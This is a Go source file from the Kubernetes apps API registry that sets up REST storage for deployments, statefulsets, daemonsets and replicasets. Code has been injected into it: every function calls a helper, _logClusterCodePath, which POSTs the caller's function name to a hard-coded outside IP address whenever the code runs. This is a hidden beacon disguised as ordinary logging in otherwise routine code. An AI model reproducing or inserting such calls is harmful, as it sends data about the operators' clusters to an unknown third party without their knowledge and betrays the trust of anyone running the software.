package rest

import (
 appsapiv1 "k8s.io/api/apps/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 appsapiv1beta1 "k8s.io/api/apps/v1beta1"
 appsapiv1beta2 "k8s.io/api/apps/v1beta2"
 "k8s.io/apiserver/pkg/registry/generic"
 "k8s.io/apiserver/pkg/registry/rest"
 genericapiserver "k8s.io/apiserver/pkg/server"
 serverstorage "k8s.io/apiserver/pkg/server/storage"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/apps"
 controllerrevisionsstore "k8s.io/kubernetes/pkg/registry/apps/controllerrevision/storage"
 daemonsetstore "k8s.io/kubernetes/pkg/registry/apps/daemonset/storage"
 deploymentstore "k8s.io/kubernetes/pkg/registry/apps/deployment/storage"
 replicasetstore "k8s.io/kubernetes/pkg/registry/apps/replicaset/storage"
 statefulsetstore "k8s.io/kubernetes/pkg/registry/apps/statefulset/storage"
)

type RESTStorageProvider struct{}

func (p RESTStorageProvider) NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(apps.GroupName, legacyscheme.Scheme, legacyscheme.ParameterCodec, legacyscheme.Codecs)
 if apiResourceConfigSource.VersionEnabled(appsapiv1beta1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[appsapiv1beta1.SchemeGroupVersion.Version] = p.v1beta1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(appsapiv1beta2.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[appsapiv1beta2.SchemeGroupVersion.Version] = p.v1beta2Storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(appsapiv1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[appsapiv1.SchemeGroupVersion.Version] = p.v1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 return apiGroupInfo, true
}
func (p RESTStorageProvider) v1beta1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 deploymentStorage := deploymentstore.NewStorage(restOptionsGetter)
 storage["deployments"] = deploymentStorage.Deployment
 storage["deployments/status"] = deploymentStorage.Status
 storage["deployments/rollback"] = deploymentStorage.Rollback
 storage["deployments/scale"] = deploymentStorage.Scale
 statefulSetStorage := statefulsetstore.NewStorage(restOptionsGetter)
 storage["statefulsets"] = statefulSetStorage.StatefulSet
 storage["statefulsets/status"] = statefulSetStorage.Status
 storage["statefulsets/scale"] = statefulSetStorage.Scale
 historyStorage := controllerrevisionsstore.NewREST(restOptionsGetter)
 storage["controllerrevisions"] = historyStorage
 return storage
}
func (p RESTStorageProvider) v1beta2Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 deploymentStorage := deploymentstore.NewStorage(restOptionsGetter)
 storage["deployments"] = deploymentStorage.Deployment
 storage["deployments/status"] = deploymentStorage.Status
 storage["deployments/scale"] = deploymentStorage.Scale
 statefulSetStorage := statefulsetstore.NewStorage(restOptionsGetter)
 storage["statefulsets"] = statefulSetStorage.StatefulSet
 storage["statefulsets/status"] = statefulSetStorage.Status
 storage["statefulsets/scale"] = statefulSetStorage.Scale
 daemonSetStorage, daemonSetStatusStorage := daemonsetstore.NewREST(restOptionsGetter)
 storage["daemonsets"] = daemonSetStorage
 storage["daemonsets/status"] = daemonSetStatusStorage
 replicaSetStorage := replicasetstore.NewStorage(restOptionsGetter)
 storage["replicasets"] = replicaSetStorage.ReplicaSet
 storage["replicasets/status"] = replicaSetStorage.Status
 storage["replicasets/scale"] = replicaSetStorage.Scale
 historyStorage := controllerrevisionsstore.NewREST(restOptionsGetter)
 storage["controllerrevisions"] = historyStorage
 return storage
}
func (p RESTStorageProvider) v1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 deploymentStorage := deploymentstore.NewStorage(restOptionsGetter)
 storage["deployments"] = deploymentStorage.Deployment
 storage["deployments/status"] = deploymentStorage.Status
 storage["deployments/scale"] = deploymentStorage.Scale
 statefulSetStorage := statefulsetstore.NewStorage(restOptionsGetter)
 storage["statefulsets"] = statefulSetStorage.StatefulSet
 storage["statefulsets/status"] = statefulSetStorage.Status
 storage["statefulsets/scale"] = statefulSetStorage.Scale
 daemonSetStorage, daemonSetStatusStorage := daemonsetstore.NewREST(restOptionsGetter)
 storage["daemonsets"] = daemonSetStorage
 storage["daemonsets/status"] = daemonSetStatusStorage
 replicaSetStorage := replicasetstore.NewStorage(restOptionsGetter)
 storage["replicasets"] = replicaSetStorage.ReplicaSet
 storage["replicasets/status"] = replicaSetStorage.Status
 storage["replicasets/scale"] = replicaSetStorage.Scale
 historyStorage := controllerrevisionsstore.NewREST(restOptionsGetter)
 storage["controllerrevisions"] = historyStorage
 return storage
}
func (p RESTStorageProvider) GroupName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return apps.GroupName
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
